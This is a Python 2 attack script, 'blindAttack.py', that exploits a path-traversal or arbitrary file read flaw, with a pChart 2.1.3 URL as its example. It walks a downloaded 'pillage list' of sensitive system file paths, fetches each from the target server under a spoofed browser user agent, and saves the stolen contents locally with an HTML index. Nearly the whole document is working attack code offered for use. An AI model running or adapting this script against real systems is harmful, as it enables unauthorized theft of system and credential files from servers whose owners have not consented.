#!/usr/bin/python 
# Author Justin Massey
#
# This script is to be used when you can read arbitrary files
# You can download a pillage list at http://pwnwiki.io/presence/linux/pillage.lst
# Pillage file also included in this repo
#
# usage: blindAttack.py "URL to blind injection" pillage file
# example: blindAttack.py "10.100.2.148/pChart2.1.3/examples/index.php?Action=View&Script=/../.." pillage.lst
#
# URL must NOT have the http(s):// prefix
# Currently hard coded for HTTP and not HTTPS
# Will exit on error if server times out after 2 seconds
# A subdirectory named blind will be created. 
# Inside of the sub dir you will find a index.html file.
# All files pillaged will be listed in the index.html file and a cached copy of each pillaged file will be stored in their respective sub dirs


import urllib, urllib2, sys, os


user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7'
values = {'name' : 'Steve Jobs' }
headers = { 'User-Agent' : user_agent }

data = urllib.urlencode(values)

# Adds a directory if one doesnt already exist
def checkDir(file):
	FILE = os.path.dirname(os.path.realpath(__file__))+"/"+file
	if not os.path.exists(os.path.dirname(FILE)):
		os.makedirs(os.path.dirname(FILE))
	
IP = sys.argv[1]

def checkServer(server):
	URL = "http://"+ IP +"/"
	req = urllib2.Request(URL, data, headers)
	try:
		urllib2.urlopen(URL, '', 2)
        except urllib2.URLError as e:
                print "Server Connection Failed: "+str(e.reason)
                sys.exit(0)
	

def newFile(file, content):
        html = file+".html"
        page = open("blind"+html, 'w+')
        page.write(content)
        page.close

def appFile(file, content):
	html = file+".html"
        page = open(file, "a")
        PAGE= os.path.realpath(__file__)
        page.write('<a href="'+os.path.dirname(PAGE)+'/blind'+html+'">'+content+'</a><br>\n\n')
        page.close

	

def checkLen(dir):
	if len(the_page) != 0:
        	checkDir("blind"+dir)
                newFile(dir, the_page)
                appFile("blind/index.html", dir)


checkServer("http://"+IP)

file = open(sys.argv[2], 'r')
for DIR in file:
	dir = DIR.rstrip()
	URL = "http://"+ IP +dir
	print URL
	req = urllib2.Request(URL, data, headers)
	try: 
		response = urllib2.urlopen(URL, '', 2)
        	the_page = response.read()
		checkLen(dir)
		# Calculates length of page

	except urllib2.HTTPError as e:
		checkDir("blind/errors.html")
		file = open("blind/errors.html", 'a')
		file.write(str(e.code)+": "+URL+"\n")
		file.close
		continue
	except urllib2.URLError as e:
		# Added rstrip to remove the \n on the IP
                checkDir("blind/errors.html")
		file = open("blind/errors.html", 'w+')
                file.write(str(e.reason)+": "+URL+"\n")
                file.close
        	continue
	        
